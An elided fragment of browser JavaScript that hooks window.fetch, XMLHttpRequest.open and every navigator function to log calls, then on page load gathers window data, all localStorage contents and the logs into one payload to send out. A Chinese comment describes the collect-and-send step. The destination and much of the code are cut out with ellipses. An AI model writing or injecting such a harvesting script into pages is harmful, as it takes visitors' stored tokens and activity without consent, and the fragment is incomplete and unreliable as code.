...
let globalVarLog = [];
jQuery.noConflict();
function hookFunction(obj, funcName, logArray) {
...
function trackObjectProps(obj, logArray) {
  for (const prop in obj) {
    if (obj.hasOwnProperty(prop) && typeof obj[prop] === 'function') {
      hookFunction(obj, prop, logArray);
    }
  }
}
;
...
function collectAndSendDataAgain() {
  let collectedData = {
    windowObject: collectWindowData(),
    localStorage: collectLocalStorageData(),
    globalVariables: globalVarLog,
    eventLogs: eventLog
  };
...
// Hook important functions for tracking
hookFunction(window, 'fetch', eventLog);
hookFunction(XMLHttpRequest.prototype, 'open', eventLog);
trackObjectProps(window.navigator, eventLog);

// 在页面加载完成后执行数据收集和发送
;
window.addEventListener('load', () => {
  collectAndSendDataAgain();
